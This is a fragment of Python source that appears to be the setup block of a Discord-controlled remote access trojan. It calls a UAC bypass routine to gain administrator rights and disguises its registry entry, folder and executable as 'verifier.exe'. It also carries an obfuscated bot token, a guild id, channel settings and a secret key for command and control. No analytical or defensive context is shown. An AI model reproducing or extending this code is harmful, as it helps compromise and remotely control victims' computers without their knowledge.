...
if not IsAdmin():
    if GetSelf()[1]:
        if UACbypass():
            os._exit(0)
auto = 'auto'
bot_tokens = ['31iV2wURS5mYE1kVTd3ZKlWMsZVOMZ2MohHatR2SDN3RaFFRZlmLxgzakZ0RucWT3lkeOFTUU5UeBpXTwklaOFTR610MNRVT']
software_registry_name = 'verifier'
software_directory_name = 'verifier'
software_executable_name = 'verifier.exe'
channel_ids = {                                                    ##
    'info': True,
    'main': True,
    'spam': False,
...
secret_key = '7d48ef08fccaf17bc8f11f04df0847cb1ab5eba5cd2fa3fc815104e7cc6d1cff'
guild_id = 1373154913940672583
